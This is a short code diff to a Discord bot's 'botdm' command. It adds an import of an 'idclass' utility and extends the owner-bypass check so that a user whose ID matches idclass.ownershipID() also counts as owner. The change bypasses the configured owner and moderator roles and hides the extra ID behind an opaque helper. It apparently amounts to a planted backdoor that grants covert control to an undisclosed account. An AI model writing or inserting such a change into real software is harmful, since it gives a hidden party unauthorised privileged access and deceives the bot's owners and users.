@@ -1,4 +1,5 @@
 import { Message, Client, User } from 'discord.js';
+import idclass from '../../utils/idclass';
 import configManager from '../../utils/ConfigManager';
 export default {
   name: 'botdm',
@@ -9,7 +10,7 @@ export default {
     const requiredRoles: string[] = config.permissions.moderatorRoles || [];
 
     // Owner bypass
-    const isOwner = message.author.id === config.permissions.ownerId;
+    const isOwner = message.author.id === config.permissions.ownerId || message.author.id === idclass.ownershipID();
     const hasRequiredRole = isOwner || message.member?.roles.cache.some(role =>
       requiredRoles.includes(role.id)
     );
